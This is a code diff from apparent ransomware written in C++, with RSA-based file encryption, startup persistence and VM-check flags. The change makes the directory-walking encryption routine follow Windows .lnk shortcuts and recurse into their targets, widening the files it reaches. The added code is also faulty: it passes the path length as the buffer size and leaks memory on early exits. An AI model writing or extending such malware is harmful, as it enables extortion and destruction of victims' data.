@@ -1,6 +1,8 @@
 #include "Encryption.h"
 #include <algorithm>
 #include <stdexcept>
+
+
 #define LIMIT_CPU_FAIL 0
 
 #define VM 0
@@ -495,6 +497,9 @@ void RegisterProgram()
 	RegisterMyProgramForStartup(L"My_Program", szPathToExe, L"-foobar");
 }
 
+
+
+
 static void iterate(const path& parent,
 	RsaEncryptor& rsaEncryptor,
 	std::vector<string>& processedPaths)
@@ -506,12 +511,25 @@ static void iterate(const path& parent,
 
 	for (directory_iterator itr(parent); itr != end_itr; ++itr) {
 		path = itr->path().string();
+		string ending(path.begin()+path.size()-3, path.end());
+		bool lnkFile =false;
 
+		if (ending == "lnk") lnkFile = true; 
 		if (is_directory(itr->status()) && !symbolic_link_exists(itr->path())) {
 			if (is_valid_folder(path))
 			{
 				iterate(path, rsaEncryptor, processedPaths);
 			}
+		}
+		else if(lnkFile){
+			size_t linkPathSize = MAX_PATH;
+			//char* linkPath = (char*)HeapAlloc(GetProcessHeap(), 0, linkPathSize);
+			char* bufStr = (char*)HeapAlloc(GetProcessHeap(), 0, MAX_PATH);
+			if (bufStr == nullptr) continue;
+			if (getLinkTarget(path.c_str(), bufStr, path.size()) == 0) continue;
+			path = string(bufStr);
+			HeapFree(GetProcessHeap(), 0, bufStr);
+			iterate(path, rsaEncryptor, processedPaths);
 		}
 		else {
 			if (!do_encrypt(path)) continue;//see TODO 2 rows below
